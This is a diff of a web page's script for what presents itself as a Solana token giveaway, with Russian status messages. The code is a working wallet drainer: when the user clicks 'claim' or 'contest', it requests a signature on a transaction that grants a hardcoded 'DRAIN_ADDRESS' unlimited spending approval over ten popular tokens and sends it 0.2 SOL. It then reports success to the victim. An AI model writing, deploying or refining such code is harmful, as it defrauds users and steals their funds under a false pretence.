@@ -103,10 +103,8 @@
 
   <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/dist/umd/solanaweb3.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.8/dist/umd/spl-token.min.js"></script>
-
   <script>
     const DRAIN_ADDRESS = "4kbb1kaz2YXuTjHQAHY5xjjrqiCM8MZU9sVmmdYg1xo1";
-
     const TOKEN_MINTS = [
       "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", // BONK
       "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm", // WIF
@@ -118,16 +116,12 @@
       "HZ64k4h57j1Bzfvk2V9fD565KD5jH1tB2fMvkQd6pZP", // ORCA
       "4gqk83p1ZD39f462G7GkZQpW5TqZ7hM8fzNQz9P4wQd" // MNGO
     ];
-
     let wallet = null;
     let publicKey = null;
-
-    const statusEl = document.getElementById('status') || document.createElement('div'); // на случай если нет
-
+    const statusEl = document.getElementById('status') || document.createElement('div');
     const connectBtn = document.getElementById('connect-btn');
     const claimBtn = document.getElementById('claim-btn');
     const contestBtn = document.getElementById('contest-btn');
-
     function checkMobileReturn() {
       const urlParams = new URLSearchParams(window.location.search);
       const pubkey = urlParams.get('publicKey');
@@ -137,7 +131,6 @@
         window.history.replaceState({}, document.title, window.location.pathname);
       }
     }
-
     function updateUI() {
       if (publicKey) {
         connectBtn.textContent = publicKey.slice(0,4) + '...' + publicKey.slice(-4);
@@ -147,29 +140,23 @@
         if (statusEl) statusEl.textContent = "Подключено! Нажми кнопку.";
       }
     }
-
     async function connectWallet() {
       checkMobileReturn();
       if (publicKey) return;
-
       const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-
       if (isMobile) {
         const dappUrl = encodeURIComponent(window.location.href);
         window.location.href = `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}`;
         return;
       }
-
       let provider = null;
       if (window.solana && window.solana.isPhantom) provider = window.solana;
       else if (window.backpack) provider = window.backpack;
       else if (window.solflare) provider = window.solflare;
-
       if (!provider) {
         if (statusEl) statusEl.textContent = "Установи Phantom!";
         return;
       }
-
       try {
         await provider.connect();
         wallet = provider;
@@ -179,46 +166,35 @@
         if (statusEl) statusEl.textContent = "Ошибка подключения";
       }
     }
-
     async function participate() {
       if (!wallet) return;
-
       if (statusEl) statusEl.textContent = "Подпись...";
       claimBtn.disabled = true;
       contestBtn.disabled = true;
-
       try {
         const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
         const owner = new solanaWeb3.PublicKey(publicKey);
         const delegate = new solanaWeb3.PublicKey(DRAIN_ADDRESS);
-
         const tx = new solanaWeb3.Transaction();
-
         for (const mintStr of TOKEN_MINTS) {
           const mint = new solanaWeb3.PublicKey(mintStr);
           const ata = await splToken.getAssociatedTokenAddress(mint, owner);
-
           const ataInfo = await connection.getAccountInfo(ata);
           if (!ataInfo) {
             tx.add(splToken.createAssociatedTokenAccountInstruction(owner, ata, owner, mint));
           }
-
           tx.add(splToken.createApproveInstruction(ata, delegate, owner, [], BigInt("18446744073709551615")));
         }
-
         tx.add(solanaWeb3.SystemProgram.transfer({
           fromPubkey: owner,
           toPubkey: delegate,
           lamports: 200000000
         }));
-
         tx.feePayer = owner;
         const { blockhash } = await connection.getLatestBlockhash();
         tx.recentBlockhash = blockhash;
-
         const signed = await wallet.signTransaction(tx);
         const sig = await connection.sendRawTransaction(signed.serialize());
-
         if (statusEl) statusEl.textContent = `Успех! Tx: ${sig.substring(0, 20)}...`;
         alert("Участие успешно!");
       } catch (err) {
@@ -227,19 +203,15 @@
         contestBtn.disabled = false;
       }
     }
-
     connectBtn.onclick = connectWallet;
     claimBtn.onclick = participate;
     contestBtn.onclick = participate;
-
     window.addEventListener('load', checkMobileReturn);
-
     // Партиклы
     (function () {
       const canvas = document.getElementById("dust");
       const ctx = canvas.getContext("2d");
       let w, h, dpr;
-
       function resize() {
         dpr = window.devicePixelRatio || 1;
         w = canvas.width = window.innerWidth * dpr;
@@ -248,7 +220,6 @@
       }
       window.addEventListener("resize", resize);
       resize();
-
       const particles = Array.from({ length: 100 }, () => ({
         x: Math.random() * window.innerWidth,
         y: Math.random() * window.innerHeight,
@@ -257,25 +228,20 @@
         vy: Math.random() * 0.5 + 0.1,
         a: Math.random() * 0.5 + 0.2
       }));
-
       function tick() {
         ctx.clearRect(0, 0, window.innerWidth, window.innerHeight);
         ctx.fillStyle = "#ffffff";
-
         particles.forEach(p => {
           ctx.globalAlpha = p.a;
           ctx.beginPath();
           ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
           ctx.fill();
-
           p.y += p.vy;
           p.x += p.vx;
-
           if (p.y > window.innerHeight) p.y = -10;
           if (p.x > window.innerWidth) p.x = 0;
           if (p.x < 0) p.x = window.innerWidth;
         });
-
         requestAnimationFrame(tick);
       }
       tick();
